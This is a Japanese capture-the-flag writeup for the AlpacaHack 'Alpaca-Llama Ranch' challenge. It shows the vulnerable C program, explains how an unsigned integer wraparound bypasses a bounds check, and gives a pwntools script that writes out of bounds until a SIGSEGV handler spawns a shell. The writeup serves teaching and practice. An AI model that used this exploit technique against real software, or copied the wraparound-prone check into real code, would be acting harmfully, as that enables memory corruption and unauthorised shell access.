# ■ Alpaca-Llama_Ranch
[Writeups - Alpaca-Llama Ranch - AlpacaHack](https://alpacahack.com/challenges/alpaca-llama-ranch/writeups)

## 1. Writeup

`chal.c`:
```C
 1	#include <stdio.h>
 2	#include <stdlib.h>
 3	#include <signal.h>
 4	
 5	#define MAX_N_ANIMAL 0x40
 6	
 7	long animal_numbers[MAX_N_ANIMAL];
 8	
 9	void handler() {
10	    execve("/bin/sh",NULL,NULL);
11	}
12	
13	int main(void) {
14	    signal(SIGSEGV, handler);
15	    unsigned alpaca, llama, i;
16	    puts("Input the number of alpaca.");
17	    scanf("%u%*c",&alpaca);
18	    puts("Input the number of llama.");
19	    scanf("%u%*c",&llama);
20	    if (alpaca+llama > MAX_N_ANIMAL) {
21	        puts("Hmm....");
22	        exit(1);
23	    }
24	    i=0;
25	    while(i<alpaca) {
26	        printf("Question %u(Alpaca): Input the identity number.",i);
27	        scanf("%ld%*c",&animal_numbers[i++]);
28	    }
29	    while(i<alpaca+llama) {
30	        printf("Question %u(Llama): Input the identity number.",i);
31	        scanf("%ld%*c",&animal_numbers[i++]);
32	    }
33	    puts("Thanks for the information!");
34	    return 0;
35	}
36	
37	__attribute__((constructor))
38	void setup() {
39	    setbuf(stdin,NULL);
40	    setbuf(stdout,NULL);
41	}
```

`chal.c#L9-L11`, `chal.c#L14` より, `SIGSEGV` を発生させればシェルを得られる.

変数`alpaca`, `llama` の型 `unsinged` は $[0,2^{32}-1]$ を表現できるが, C/C++ではオーバーフローを起こすと$2^{32}$の剰余となる.

このしくみを利用して, $\text{alpaca}+\text{llama}=2^{32}\equiv 0\pmod{2^{32}}$ となるように値を渡すことで `chal.c#L20`:`if (alpaca+llama > MAX_N_ANIMAL)` の判定をbypassできる. ($2^{32}$ 以上かつ, $2^{32}$ の剰余が `MAX_N_ANIMAL` 未満である任意の値であればよい.)

その後 `SIGSEGV` が発生する(領域外書き込み)まで入力を続けることでシェルを取得できる.

`solve.py`
```python
 1	from pwn import *
 2	
 3	HOST = "localhost"
 4	PORT = 9999
 5	io = remote(HOST, PORT)
 6	
 7	io.sendlineafter(b'Input the number of alpaca.', str(0xffffffff).encode())
 8	io.sendlineafter(b'Input the number of llama.', b'1')
 9	for _ in range(505):
10		io.sendline(b'0')
11	
12	io.interactive()
```

- `0xffffffff`$=2^{32}-1$
- ループが505回である理由は, 505回目の入力で `SIGSEGV` が発生するため.